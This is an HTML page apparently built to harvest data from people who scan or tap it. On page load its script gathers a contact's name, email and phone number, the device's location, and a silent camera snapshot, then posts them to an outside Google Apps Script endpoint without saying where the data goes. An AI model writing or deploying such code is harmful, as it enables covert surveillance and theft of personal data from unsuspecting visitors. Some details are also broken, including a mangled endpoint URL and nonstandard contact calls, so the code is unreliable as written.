<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Information</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
        }
        #message {
            margin-top: 20px;
            font-size: 18px;
            color: green;
        }
    </style>
</head>
<body>
    <h1>Scan or Tap to Capture Information</h1>
    <p>Please allow access to your contacts, location, and camera.</p>
    <div id="message"></div>

    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const message = document.getElementById('message');

            // Request permissions
            navigator.permissions.query({ name: 'contacts' }).then(result => {
                if (result.state === 'granted') {
                    captureContacts();
                } else {
                    message.textContent = 'Contacts access not granted.';
                }
            });

            navigator.permissions.query({ name: 'geolocation' }).then(result => {
                if (result.state === 'granted') {
                    captureLocation();
                } else {
                    message.textContent = 'Location access not granted.';
                }
            });

            navigator.permissions.query({ name: 'camera' }).then(result => {
                if (result.state === 'granted') {
                    capturePhoto();
                } else {
                    message.textContent = 'Camera access not granted.';
                }
            });

            function captureContacts() {
                navigator.contacts.getAll().then(contacts => {
                    const contact = contacts[0]; // Assuming the first contact is the user
                    const phoneNumber = contact.tel[0].value;
                    const email = contact.emails[0].value;
                    const name = contact.name.formatted;
                    sendDataToServer(name, email, phoneNumber);
                });
            }

            function captureLocation() {
                navigator.geolocation.getCurrentPosition(position => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    sendDataToServer(null, null, null, latitude, longitude);
                });
            }

            function capturePhoto() {
                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    video.onloadedmetadata = () => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const context = canvas.getContext('2d');
                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const photo = canvas.toDataURL('image/jpeg');
                        sendDataToServer(null, null, null, null, null, photo);
                    };
                });
            }

            function sendDataToServer(name, email, phoneNumber, latitude, longitude, photo) {
                fetch('[https://script.google.com/macros/s/AKfycbzwaHFzme8IT67yRMpeqqa0MusN5eyaX7qjEGflMqjjE6ctiNI0s1dEB93RRq9PnC0/exec)', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        name: name,
                        email: email,
                        phoneNumber: phoneNumber,
                        latitude: latitude,
                        longitude: longitude,
                        photo: photo
                    })
                })
                .then(response => response.json())
                .then(data => {
                    message.textContent = 'Information captured successfully!';
                })
                .catch(error => {
                    console.error('Error:', error);
                    message.textContent = 'Failed to capture information.';
                });
            }
        });
    </script>
</body>
</html>
